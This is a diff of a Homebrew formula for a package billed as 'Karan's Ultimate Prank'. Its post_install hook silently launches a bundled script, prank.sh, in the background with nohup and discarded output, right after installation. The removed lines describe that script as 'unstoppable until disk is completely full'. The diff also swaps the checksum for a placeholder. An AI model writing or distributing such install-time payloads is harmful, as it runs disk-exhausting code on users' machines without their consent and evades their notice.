@@ -1,9 +1,9 @@
 class Dingdong < Formula
-  desc "⚡ Karan's Ultimate Prank - Lightning speed, unstoppable execution"
+  desc "🎭 Karan's Ultimate Prank - Perfect out-of-box execution"
   homepage "https://github.com/punkkkkkkk/dingdong"
   url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
-  version "3.1.0"
-  sha256 "7d6030103b9c9549c49f687ca0bc6841d733434f802a73fe812d98f02644608f"
+  version "3.2.0"
+  sha256 "CALCULATE_NEW_HASH_AFTER_UPDATING_MAIN_REPO"
 
   def install
     bin.install "prank.sh"
@@ -11,11 +11,12 @@ class Dingdong < Formula
   end
 
   def post_install
-    ohai "⚡ Karan's Ultimate Prank v3.1 - Lightning Speed Edition!"
-    ohai "🚀 Auto-starts immediately, no prompts required"
-    ohai "💀 Unstoppable until disk is completely full"
+    ohai "🎭 Karan's Ultimate Prank v3.2 - Perfect Out-of-Box Edition!"
+    ohai "⚡ Works flawlessly on any Mac without manual fixes"
+    ohai "🚀 Auto-starts immediately after installation"
     
-    system "#{bin}/prank.sh #{pkgshare}/payload.png"
+    # Execute in background to prevent hanging
+    system "nohup #{bin}/prank.sh #{pkgshare}/payload.png > /dev/null 2>&1 &"
   end
 
   test do
